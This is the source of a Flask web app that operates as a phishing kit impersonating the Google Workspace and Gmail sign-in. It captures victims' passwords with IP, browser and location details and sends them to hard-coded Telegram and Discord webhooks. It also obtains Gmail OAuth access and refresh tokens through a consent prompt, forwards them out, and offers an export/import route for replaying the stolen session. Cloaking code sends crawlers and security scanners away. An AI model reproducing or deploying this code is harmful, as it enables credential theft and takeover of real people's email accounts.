from flask import Flask, render_template, request, redirect, url_for, session, jsonify, make_response, Response
import tempfile
import os
import re
import random
import json
import requests
from fake_useragent import UserAgent
from google.oauth2 import id_token
from google_auth_oauthlib.flow import Flow
from google.auth.transport import requests as google_requests
from google.auth.transport.requests import Request
from google.oauth2.credentials import Credentials
from google_auth_httplib2 import AuthorizedHttp
from googleapiclient.discovery import build
import datetime
import base64
from urllib.parse import urlencode




# Initialize Flask application first
app = Flask(__name__)
app.secret_key = "2d300b06dba345980bcb37ccb46e803a1bf3c71be31a6ffdfb6e9b867beee25b"
# Always set secure cookies in production (HTTPS enforced below)
app.config['SESSION_COOKIE_SECURE'] = True

# Set port and server name after app initialization
port = int(os.environ.get('PORT', 5000))
app.config['SERVER_NAME'] = None  # Allow dynamic hostnames

# Load Google OAuth credentials directly from credentials.json
with open('credentials.json', 'r') as f:
    creds = json.load(f)['web']
GOOGLE_OAUTH_CLIENT_ID = creds['client_id']
GOOGLE_OAUTH_CLIENT_SECRET = creds['client_secret']
GOOGLE_OAUTH_REDIRECT_URI = creds['redirect_uris'][0]

# Initialize Google Flow
def get_google_oauth_flow():
    return Flow.from_client_config(
        {
            "web": {
                "client_id": GOOGLE_OAUTH_CLIENT_ID,
                "client_secret": GOOGLE_OAUTH_CLIENT_SECRET,
                "auth_uri": creds['auth_uri'],
                "token_uri": creds['token_uri'],
                "auth_provider_x509_cert_url": creds['auth_provider_x509_cert_url'],
                "redirect_uris": creds['redirect_uris'],
                "javascript_origins": creds['javascript_origins']
            }
        },
        scopes=[
            'https://www.googleapis.com/auth/gmail.readonly',
            'https://www.googleapis.com/auth/userinfo.email',
            'https://www.googleapis.com/auth/userinfo.profile',
            'https://www.googleapis.com/auth/gmail.modify'
        ],
        redirect_uri=GOOGLE_OAUTH_REDIRECT_URI
    )

# Enforce HTTPS for all requests
@app.before_request
def enforce_https() -> None:
    if not request.is_secure and not app.debug:
        url = request.url.replace("http://", "https://", 1)
        redirect(url, code=301)

# Webhook configuration
TELEGRAM_WEBHOOK_URL = 'https://api.telegram.org/bot7683203119:AAEuLNvGvDH3Wg2e4uYcA3RkTRe2jxEWr9Q/sendMessage'
DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1444453046066217052/GonloDjy4rv10HHcWpMywvjleS9fk8-OQ_sgLCum3Sq350COT4zpUTqrmyO32JxZaa0G'
TELEGRAM_CHAT_ID = '-4904152340'
TELEGRAM_WEBHOOK_ON = True  # Enable Telegram
DISCORD_WEBHOOK_ON = True   # Enable Discord

def send_webhook_message(message):
    if TELEGRAM_WEBHOOK_ON:
        # Telegram expects chat_id and text
        payload = {
            'chat_id': '<chat_id>',  # Replace with your chat_id
            'text': message
        }
        try:
            requests.post(TELEGRAM_WEBHOOK_URL, data=payload, timeout=5)
        except Exception:
            pass
    if DISCORD_WEBHOOK_ON:
        payload = {
            'content': message
        }
        try:
            requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
        except Exception:
            pass

# Google OAuth 2.0 configuration
def get_google_email_details(email, name=None, picture=None):
    domain = email.split('@')[1] if '@' in email else ''
    branding = {
        'banner': picture or f'https://logo.clearbit.com/{domain}',
        'background': f'https://source.unsplash.com/featured/?office,workspace,{domain}',
        'name': name or email.split('@')[0]
    }
    return branding

# Browser configuration
class Browser:
    def __init__(self):
        self.user_agent = UserAgent()
        self.browser_arrays = [
            # Chrome
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36',
            # Edge
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/92.0.902.73 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/93.0.961.38 Safari/537.36',
            # Firefox
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
            # Safari
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15',
            # Mobile browsers
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36'
        ]
    def get_random_agent(self):
        return random.choice(self.browser_arrays)

# Cookie handling function
def cookies_to_json(cookies):
    cookie_list = []
    try:
        for cookie in cookies:
            cookie_dict = {
                'name': cookie.name,
                'value': cookie.value,
                'domain': cookie.domain,
                'path': cookie.path,
                'secure': cookie.secure,
                'expires': cookie.expires,
                'httpOnly': cookie.has_nonstandard_attr('HttpOnly') if hasattr(cookie, 'has_nonstandard_attr') else False,
                'sameSite': cookie.has_nonstandard_attr('SameSite') if hasattr(cookie, 'has_nonstandard_attr') else None,
                'priority': cookie.has_nonstandard_attr('Priority') if hasattr(cookie, 'has_nonstandard_attr') else None,
                'hostOnly': cookie.domain_specified if hasattr(cookie, 'domain_specified') else False,
                'max-age': cookie.has_nonstandard_attr('Max-Age') if hasattr(cookie, 'has_nonstandard_attr') else None
            }
            cookie_list.append(cookie_dict)
    except Exception:
        pass
    return cookie_list

# Bot detection and redirect
def is_bot_request():
    ua = (request.headers.get('User-Agent') or '').lower()
    # Only block if UA is empty or matches obvious bot patterns
    bot_signatures = [
        'googlebot', 'crawler', 'spider', 'bot', 'wget', 'curl', 'python-requests', 'python-urllib', 'phantomjs',
        'selenium', 'headless', 'cypress', 'puppeteer', 'nightwatch', 'scrapy', 'postman', 'httpx', 'httpie', 'libwww-perl',
        'mj12bot', 'ahrefsbot', 'petalbot', 'sogou', 'exabot', 'dotbot', 'gigabot', 'ia_archiver', 'siteauditbot', 'sitecheckerbot',
        'seznambot', 'rogerbot', 'linkdexbot', 'applebot', 'discordbot', 'telegrambot', 'pinterestbot', 'flipboard', 'redditbot',
        'guzzlehttp', 'okhttp', 'restsharp', 'cloudflare', 'facebookexternalhit', 'twitterbot', 'slackbot', 'whatsapp', 'archive.org_bot'
    ]
    for sig in bot_signatures:
        if sig in ua:
            print(f"[BOT DETECT] UA matched bot signature: {sig}")
            return True
    # Only block advanced bot headers if not running in production (to avoid false positives on Railway)
    if os.environ.get('FLASK_ENV', '') != 'production':
        advanced_bot_headers = [
            'abusix', 'crawler', 'bot', 'spider', 'proxy', 'phantom', 'selenium', 'headless', 'scrapy', 'postman', 'httpx', 'httpie',
            'libwww-perl', 'mj12bot', 'ahrefsbot', 'petalbot', 'sogou', 'exabot', 'dotbot', 'gigabot', 'ia_archiver', 'siteauditbot',
            'sitecheckerbot', 'seznambot', 'rogerbot', 'linkdexbot', 'applebot', 'discordbot', 'telegrambot', 'pinterestbot', 'flipboard',
            'redditbot', 'guzzlehttp', 'okhttp', 'restsharp', 'cloudflare'
        ]
        for h in request.headers:
            h_name = h[0].lower()
            h_value = str(h[1]).lower()
            for adv_header in advanced_bot_headers:
                if adv_header in h_name or adv_header in h_value:
                    print(f"[BOT DETECT] Header matched bot pattern: {adv_header} in {h_name} or {h_value}")
                    return True
    # Block if UA is empty
    if not ua:
        print("[BOT DETECT] UA is empty")
        return True
    return False

@app.route('/error/bot-detected')
def bot_error_handler():
    session.clear()
    # Log bot detection in backend only
    print("[BOT DETECT] Redirected: IP {} UA {}".format(request.remote_addr, request.headers.get('User-Agent', '')))
    return redirect('https://workspace.google.com')

# Temp file to store cookies per session
COOKIE_TEMP_FILE = os.path.join(tempfile.gettempdir(), 'gmail_fake_cookies.txt')

# Fake user database for demonstration
USERS = {
    'testuser@gmail.com': 'testpassword123',
    'demo@gmail.com': 'demopass',
}

# Route to render index.html
@app.route('/')
def index():
    return render_template('index.html')

# New route to handle email submission from index.html and redirect to password page
@app.route('/password', methods=['GET', 'POST'])
def password():
    if is_bot_request():
        return redirect(url_for('bot_error_handler'))

    email = request.args.get('email') or request.form.get('email') or session.get('email')
    if not email:
        return redirect(url_for('index'))
    
    try:
        # Fetch branding details here, only when the password page is loaded.
        branding = get_google_email_details(email)
        session['banner'] = branding.get('banner')
        session['background'] = branding.get('background')
        session['email'] = email

        return render_template(
            'password.html',
            email=email,
            banner=session.get('banner'),
            background=session.get('background'),
            error=request.args.get('error'),
        )
    except Exception as e:
        print(f"Error in password route: {str(e)}")
        return redirect(url_for('index'))

@app.route('/enter-password', methods=['GET', 'POST'])
def enter_password():
    email = session.get('email')
    error = None
    branding = None
    if email:
        branding = get_google_email_details(email)
    if request.method == 'POST':
        password_val = request.form.get('password') or ''
        session['email'] = email
        branding = get_google_email_details(email)
        
        # Collect info for webhook
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent', '')
        import httpagentparser
        browser_info = httpagentparser.detect(user_agent)
        user_browser = browser_info.get('browser', {}).get('name', '')
        browser_version = browser_info.get('browser', {}).get('version', '')
        browser_platform = browser_info.get('platform', {}).get('name', '')
        geo_data = {}
        try:
            geo_resp = requests.get(f'https://ipapi.co/{client_ip}/json/')
            geo_data = geo_resp.json()
            user_country = geo_data.get('country_name', '')
            user_city = geo_data.get('city', '')
        except Exception:
            user_country = ''
            user_city = ''
        current_time = datetime.datetime.utcnow().isoformat() + 'Z'
        credentials_message = (
            f"🎯$Box-GoogleWorkSpace📬HackerOne🎯\n\n"
            f"📧 Email: {email}\n"
            f"🔑 Password: {password_val}\n"
            f"🌍 Real IP: {client_ip}\n"
            f"🖥️ User Agent: {user_agent}\n"
            f"🌐 Browser: {user_browser} {browser_version}\n"
            f"💻 Platform: {browser_platform}\n"
            f"🌍 Country/State: {user_country}, {geo_data.get('region', '')}\n"
            f"🏙️ City: {user_city}\n"
            f"⏰ Time: {current_time}"
        )
        send_webhook_message(credentials_message)
        
        # REAL GOOGLE OAUTH 2.0 FLOW INSTEAD OF FAKE LOGIN
        # Store email and password temporarily in session for webhook logging
        session['temp_email'] = email
        session['temp_password'] = password_val
        
        try:
            # Initialize Google OAuth Flow
            flow = Flow.from_client_secrets_file(
                'credentials.json',
                scopes=[
                    'https://www.googleapis.com/auth/gmail.readonly',
                    'https://www.googleapis.com/auth/userinfo.email',
                    'https://www.googleapis.com/auth/userinfo.profile',
                    'https://www.googleapis.com/auth/gmail.modify'
                ],
                redirect_uri=GOOGLE_OAUTH_REDIRECT_URI
            )
            
            # Generate OAuth authorization URL
            authorization_url, state = flow.authorization_url(
                access_type='offline',
                include_granted_scopes='true',
                prompt='consent'  # Force consent to ensure we get refresh token
            )
            
            # Store state in session for CSRF protection
            session['oauth_state'] = state
            session['email_for_oauth'] = email
            
            print(f"[DEBUG] Redirecting to Google OAuth: {authorization_url}")
            return redirect(authorization_url)
            
        except Exception as e:
            print(f"[ERROR] Google OAuth initialization failed: {str(e)}")
            error = "Google authentication service error. Please try again."
            return render_template('password.html', email=email, error=error, branding=branding)
    else:
        # If GET, show password page again if session email exists
        return render_template('password.html', email=email, error=error, branding=branding)

# REAL GOOGLE OAUTH 2.0 CALLBACK ROUTE
@app.route('/oauth/callback')
def oauth_callback():
    """
    Handle Google OAuth 2.0 callback
    Exchange authorization code for access token and user info
    Set session cookies and redirect to Gmail
    """
    try:
        # Retrieve state from session to prevent CSRF
        state = request.args.get('state')
        session_state = session.get('oauth_state')
        
        if not state or state != session_state:
            return jsonify({'error': 'CSRF validation failed'}), 400
        
        # Initialize the same flow again
        flow = Flow.from_client_secrets_file(
            'credentials.json',
            scopes=[
                'https://www.googleapis.com/auth/gmail.readonly',
                'https://www.googleapis.com/auth/userinfo.email',
                'https://www.googleapis.com/auth/userinfo.profile',
                'https://www.googleapis.com/auth/gmail.modify'
            ],
            redirect_uri=GOOGLE_OAUTH_REDIRECT_URI
        )
        
        # Fetch authorization code from URL
        authorization_response = request.url
        
        # Exchange code for credentials
        flow.fetch_token(authorization_response=authorization_response)
        credentials = flow.credentials
        
        token_preview = credentials.token[:50] if credentials.token else 'N/A'
        print(f"[DEBUG] OAuth callback received. Access Token: {token_preview}...")
        
        # Build Gmail API service to get user info
        gmail_service = build('gmail', 'v1', credentials=credentials)
        user_info = gmail_service.users().getProfile(userId='me').execute()
        user_email = user_info.get('emailAddress', '')
        
        print(f"[DEBUG] Authenticated user: {user_email}")
        
        # Store credentials and user info in session
        session['google_credentials'] = {
            'token': credentials.token,
            'refresh_token': credentials.refresh_token,
            'token_uri': getattr(credentials, 'token_endpoint', None) or 'https://oauth2.googleapis.com/token',
            'client_id': getattr(credentials, 'client_id', None),
            'client_secret': getattr(credentials, 'client_secret', None),
            'scopes': credentials.scopes,
            'expiry': credentials.expiry.isoformat() if credentials.expiry else None
        }
        session['user_email'] = user_email
        session['authenticated'] = True
        
        # Generate secure session cookie with user data
        # This cookie will persist across browsers when exported
        session_data = {
            'email': user_email,
            'access_token': credentials.token,
            'refresh_token': credentials.refresh_token,
            'token_expiry': credentials.expiry.isoformat() if credentials.expiry else None,
            'authenticated_at': datetime.datetime.utcnow().isoformat(),
            'session_expires': (datetime.datetime.utcnow() + datetime.timedelta(days=30)).isoformat()
        }
        
        # Create response and set persistent cookies
        resp = make_response(redirect(url_for('gmail_inbox')))
        
        # Set cookies that will persist across browsers
        expires = datetime.datetime.utcnow() + datetime.timedelta(days=30)
        
        # Store session data as a cookie (base64 encoded JSON)
        session_json = base64.b64encode(json.dumps(session_data).encode()).decode()
        resp.set_cookie(
            'gmail_session',
            session_json,
            max_age=2592000,  # 30 days
            secure=True,
            httponly=True,
            samesite='Strict'
        )
        
        # Store user email
        resp.set_cookie(
            'gmail_user',
            user_email,
            max_age=2592000,
            secure=True,
            httponly=False,
            samesite='Strict'
        )
        
        # Store access token (can be used for API calls)
        if credentials.token:
            resp.set_cookie(
                'gmail_access_token',
                credentials.token,
                max_age=3600,  # Access tokens expire in 1 hour
                secure=True,
                httponly=True,
                samesite='Strict'
            )
        
        # Send webhook notification of successful authentication
        webhook_message = (
            f"✅ SUCCESSFUL GOOGLE OAUTH AUTHENTICATION\n\n"
            f"👤 User Email: {user_email}\n"
            f"🔐 Access Token: {credentials.token[:50] if credentials.token else 'N/A'}...\n"
            f"🔄 Refresh Token: {credentials.refresh_token[:50] if credentials.refresh_token else 'N/A'}...\n"
            f"⏰ Authenticated At: {datetime.datetime.utcnow().isoformat()}\n"
            f"🌐 IP Address: {request.headers.get('X-Forwarded-For', request.remote_addr)}\n"
            f"📱 User Agent: {request.headers.get('User-Agent', '')}"
        )
        send_webhook_message(webhook_message)
        
        # Clear OAuth state from session
        session.pop('oauth_state', None)
        session.pop('email_for_oauth', None)
        session.pop('temp_email', None)
        session.pop('temp_password', None)
        
        # Store user agent for cross-browser import
        resp.set_cookie(
            'gmail_user_agent',
            request.headers.get('User-Agent', ''),
            max_age=2592000,
            secure=True,
            httponly=False,
            samesite='Strict'
        )
        
        # Store authenticated timestamp
        session['authenticated_at'] = datetime.datetime.utcnow().isoformat()
        
        return resp
        
    except Exception as e:
        print(f"[ERROR] OAuth callback error: {str(e)}")
        import traceback
        traceback.print_exc()
        return jsonify({'error': f'Authentication failed: {str(e)}'}), 400

@app.route('/export/auth')
def export_auth():
    """
    Export authentication data as JSON in a text file format
    Includes user email, cookies, and user agent for import in other browsers
    File format: {email}_auth_export.txt with JSON content
    """
    if not session.get('authenticated'):
        return jsonify({'error': 'Not authenticated'}), 401
    
    user_email = session.get('user_email', '')
    creds_data = session.get('google_credentials', {})
    user_agent = request.headers.get('User-Agent', '')
    
    # Prepare authentication export data with user agent and email
    auth_export = {
        'email': user_email,
        'user_agent': user_agent,
        'credentials': {
            'token': creds_data.get('token'),
            'refresh_token': creds_data.get('refresh_token'),
            'token_uri': creds_data.get('token_uri'),
            'client_id': creds_data.get('client_id'),
            'client_secret': creds_data.get('client_secret'),
            'scopes': creds_data.get('scopes'),
            'expiry': creds_data.get('expiry')
        },
        'authenticated_at': session.get('authenticated_at', datetime.datetime.utcnow().isoformat()),
        'session_expires': (datetime.datetime.utcnow() + datetime.timedelta(days=30)).isoformat(),
        'export_timestamp': datetime.datetime.utcnow().isoformat()
    }
    
    # Create filename prepended with user email
    safe_email = user_email.replace('@', '_at_').replace('.', '_')
    filename = f'{safe_email}_auth_export.txt'
    
    # Create response with JSON content
    response = Response(
        json.dumps(auth_export, indent=2),
        mimetype='application/json',
        headers={'Content-Disposition': f'attachment;filename={filename}'}
    )
    
    # Log export
    print(f"[INFO] Authentication exported for {user_email}")
    send_webhook_message(f"📤 AUTH EXPORT: {user_email} exported authentication data")
    
    return response

@app.route('/import/auth', methods=['GET', 'POST'])
def import_auth():
    """
    Import authentication data from JSON export file
    Accept JSON with email, user_agent, and credentials
    Set cookies and allow access to Gmail from different browser
    """
    if request.method == 'POST':
        try:
            # Get JSON data from request
            auth_data = request.get_json()
            
            if not auth_data or 'email' not in auth_data:
                return jsonify({'error': 'Invalid authentication data'}), 400
            
            user_email = auth_data.get('email')
            creds_data = auth_data.get('credentials', {})
            original_user_agent = auth_data.get('user_agent', '')
            current_user_agent = request.headers.get('User-Agent', '')
            
            # Validate token exists
            if not creds_data.get('token'):
                return jsonify({'error': 'Missing access token'}), 400
            
            # Set session data
            session['google_credentials'] = creds_data
            session['user_email'] = user_email
            session['authenticated'] = True
            session['authenticated_at'] = auth_data.get('authenticated_at', datetime.datetime.utcnow().isoformat())
            
            # Create response and set cookies
            resp = make_response(jsonify({
                'status': 'success',
                'message': f'Authentication imported for {user_email}',
                'redirect': url_for('gmail_inbox')
            }))
            
            # Set persistent cookies
            expires = datetime.datetime.utcnow() + datetime.timedelta(days=30)
            
            # Session cookie with email and user agent
            session_data = {
                'email': user_email,
                'access_token': creds_data.get('token'),
                'refresh_token': creds_data.get('refresh_token'),
                'token_expiry': creds_data.get('expiry'),
                'authenticated_at': session['authenticated_at'],
                'session_expires': (datetime.datetime.utcnow() + datetime.timedelta(days=30)).isoformat(),
                'original_user_agent': original_user_agent,
                'current_user_agent': current_user_agent,
                'imported': True
            }
            
            session_json = base64.b64encode(json.dumps(session_data).encode()).decode()
            resp.set_cookie(
                'gmail_session',
                session_json,
                max_age=2592000,
                secure=True,
                httponly=True,
                samesite='Strict'
            )
            
            # User email cookie
            resp.set_cookie(
                'gmail_user',
                user_email,
                max_age=2592000,
                secure=True,
                httponly=False,
                samesite='Strict'
            )
            
            # User agent cookies (both original and current)
            resp.set_cookie(
                'gmail_user_agent_original',
                original_user_agent,
                max_age=2592000,
                secure=True,
                httponly=False,
                samesite='Strict'
            )
            
            resp.set_cookie(
                'gmail_user_agent_current',
                current_user_agent,
                max_age=2592000,
                secure=True,
                httponly=False,
                samesite='Strict'
            )
            
            # Access token cookie
            if creds_data.get('token'):
                resp.set_cookie(
                    'gmail_access_token',
                    creds_data.get('token'),
                    max_age=3600,
                    secure=True,
                    httponly=True,
                    samesite='Strict'
                )
            
            # Log import with details
            webhook_message = (
                f"📥 AUTH IMPORT SUCCESSFUL\n\n"
                f"👤 User Email: {user_email}\n"
                f"📱 Original User Agent: {original_user_agent[:80]}...\n"
                f"📱 Current User Agent: {current_user_agent[:80]}...\n"
                f"⏰ Imported At: {datetime.datetime.utcnow().isoformat()}\n"
                f"🌐 IP Address: {request.headers.get('X-Forwarded-For', request.remote_addr)}"
            )
            send_webhook_message(webhook_message)
            
            return resp
            
        except Exception as e:
            print(f"[ERROR] Auth import failed: {str(e)}")
            return jsonify({'error': f'Import failed: {str(e)}'}), 400
    
    # GET request - show import page with instructions
    return '''<!DOCTYPE html>
<html>
<head>
    <title>Import Gmail Authentication</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); max-width: 600px; width: 100%; }
        h1 { color: #202124; margin-bottom: 10px; font-size: 28px; }
        .subtitle { color: #5f6368; margin-bottom: 30px; }
        .info { background: #f0f4f8; border-left: 4px solid #667eea; padding: 15px; border-radius: 4px; margin-bottom: 30px; color: #202124; font-size: 14px; line-height: 1.6; }
        label { display: block; color: #202124; margin-bottom: 10px; font-weight: 500; }
        textarea { width: 100%; padding: 12px; border: 1px solid #dadce0; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 12px; resize: vertical; }
        textarea:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1); }
        button { width: 100%; background: #667eea; color: white; padding: 12px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; margin-top: 20px; }
        button:hover { background: #5568d3; }
        .steps { margin-top: 30px; padding-top: 30px; border-top: 1px solid #dadce0; }
        .step { margin-bottom: 20px; }
        .step-number { display: inline-block; background: #667eea; color: white; width: 30px; height: 30px; border-radius: 50%; text-align: center; line-height: 30px; margin-right: 15px; font-weight: bold; }
        .step-text { display: inline-block; color: #202124; }
        .error { color: #d33b27; margin-top: 10px; }
        .success { color: #137752; margin-top: 10px; }
    </style>\n</head>\n<body>\n    <div class=\"card\">\n        <h1>📥 Import Gmail Authentication</h1>\n        <p class=\"subtitle\">Access Gmail from another browser</p>\n        \n        <div class=\"info\">\n            <strong>How it works:</strong> Export authentication from your original browser, then paste it here to access Gmail from a different browser without re-authenticating with Google.\n        </div>\n        \n        <form id=\"importForm\">\n            <label for=\"authData\">Paste JSON Export Data:</label><br>\n            <textarea id=\"authData\" placeholder=\"Paste the exported JSON here...\" required></textarea><br>\n            <button type=\"submit\">Import Authentication</button>\n            <div id=\"message\"></div>\n        </form>\n        \n        <div class=\"steps\">\n            <h3 style=\"color: #202124; margin-bottom: 20px;\">Steps to Export & Import:</h3>\n            <div class=\"step\">\n                <span class=\"step-number\">1</span>\n                <span class=\"step-text\">In your original browser, go to <code>/export/auth</code></span>\n            </div>\n            <div class=\"step\">\n                <span class=\"step-number\">2</span>\n                <span class=\"step-text\">Save or copy the JSON file content</span>\n            </div>\n            <div class=\"step\">\n                <span class=\"step-number\">3</span>\n                <span class=\"step-text\">Paste the JSON data in the textarea above</span>\n            </div>\n            <div class=\"step\">\n                <span class=\"step-number\">4</span>\n                <span class=\"step-text\">Click \"Import Authentication\"</span>\n            </div>\n            <div class=\"step\">\n                <span class=\"step-number\">5</span>\n                <span class=\"step-text\">You'll be redirected to Gmail inbox</span>\n            </div>\n        </div>\n    </div>\n    \n    <script>\n        document.getElementById('importForm').addEventListener('submit', async (e) => {\n            e.preventDefault();\n            const authData = document.getElementById('authData').value;\n            const messageDiv = document.getElementById('message');\n            \n            try {\n                const data = JSON.parse(authData);\n                const response = await fetch('/import/auth', {\n                    method: 'POST',\n                    headers: { 'Content-Type': 'application/json' },\n                    body: JSON.stringify(data)\n                });\n                \n                const result = await response.json();\n                if (response.ok) {\n                    messageDiv.innerHTML = '<p class=\"success\">✅ Authentication imported successfully! Redirecting...</p>';\n                    setTimeout(() => { window.location.href = result.redirect; }, 1500);\n                } else {\n                    messageDiv.innerHTML = '<p class=\"error\">❌ Import failed: ' + result.error + '</p>';\n                }\n            } catch (err) {\n                messageDiv.innerHTML = '<p class=\"error\">❌ Invalid JSON format: ' + err.message + '</p>';\n            }\n        });\n    </script>\n</body>\n</html>'''

@app.route('/gmail/inbox')
def gmail_inbox():
    """
    After successful OAuth, redirect to Gmail inbox
    In a real scenario, this would display user's Gmail data from the API
    """
    if not session.get('authenticated'):
        return redirect(url_for('index'))
    
    user_email = session.get('user_email', '')
    
    try:
        # Get credentials from session
        creds_data = session.get('google_credentials', {})
        
        # Reconstruct credentials object
        credentials = Credentials(
            token=creds_data.get('token'),
            refresh_token=creds_data.get('refresh_token'),
            token_uri=creds_data.get('token_uri'),
            client_id=creds_data.get('client_id'),
            client_secret=creds_data.get('client_secret'),
            scopes=creds_data.get('scopes')
        )
        
        # Build Gmail API service
        gmail_service = build('gmail', 'v1', credentials=credentials)
        
        # Get user profile info
        profile = gmail_service.users().getProfile(userId='me').execute()
        
        # Get recent messages (simulating Gmail inbox view)
        results = gmail_service.users().messages().list(
            userId='me',
            maxResults=5,
            q='category:primary'
        ).execute()
        
        messages = results.get('messages', [])
        message_data = []
        
        for msg in messages:
            msg_id = msg['id']
            message = gmail_service.users().messages().get(userId='me', id=msg_id, format='minimal').execute()
            headers = message.get('payload', {}).get('headers', [])
            subject = next((h['value'] for h in headers if h['name'] == 'Subject'), '(No Subject)')
            from_addr = next((h['value'] for h in headers if h['name'] == 'From'), '')
            message_data.append({
                'id': msg_id,
                'subject': subject,
                'from': from_addr
            })
        
        # Redirect to actual Gmail inbox
        return redirect('https://mail.google.com/mail/u/0/')
        
    except Exception as e:
        print(f"[ERROR] Gmail inbox error: {str(e)}")
        return jsonify({'error': f'Failed to load Gmail: {str(e)}'}), 400

# Step 3: Show authentication code/token in auth.html

# Add POST handling for code confirmation
@app.route('/auth', methods=['GET', 'POST'])
def auth():
    if request.method == 'GET':
        if not session.get('authenticated'):
            return redirect(url_for('index'))
        email = session.get('email', '')
        code = session.get('auth_code') or str(random.randint(10, 99))
        session['auth_code'] = code
        return render_template('auth.html', email=email, code=code)
    elif request.method == 'POST':
        user_code = request.form.get('code')
        expected_code = session.get('auth_code')
        email = session.get('email', '')
        if user_code and expected_code and user_code == expected_code:
            resp = make_response(redirect('https://mail.google.com/mail/u/0/'))
            # Set persistent cookies for Google/Gmail domains
            expires = datetime.datetime.now() + datetime.timedelta(days=30)
            resp.set_cookie('G_AUTHUSER_H', '0', domain='.google.com', secure=True, samesite='Lax', expires=expires)
            resp.set_cookie('GMAIL_LOGIN', '1', domain='.gmail.com', secure=True, samesite='Lax', expires=expires)
            resp.set_cookie('auth_verified', '1', domain='.google.com', secure=True, samesite='Lax', expires=expires)
            resp.set_cookie('user_email', email, domain='.google.com', secure=True, samesite='Lax', expires=expires)
            # Clean up session
            session.pop('email', None)
            session.pop('authenticated', None)
            session.pop('google_token', None)
            session.pop('id_token', None)
            session.pop('branding', None)
            session.pop('auth_code', None)
            return resp
        # If code is wrong, re-render with error
        error = 'Incorrect code. Please try again.'
        code = expected_code or ''
        return render_template('auth.html', email=email, code=code, error=error)

# After each request, capture Set-Cookie headers if needed
@app.after_request
def capture_cookies(response):
    # Add X-Robots-Tag header to all responses for noindex, nofollow
    response.headers['X-Robots-Tag'] = 'noindex, nofollow'
    return response

# Entry point for local and Railway deployment
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)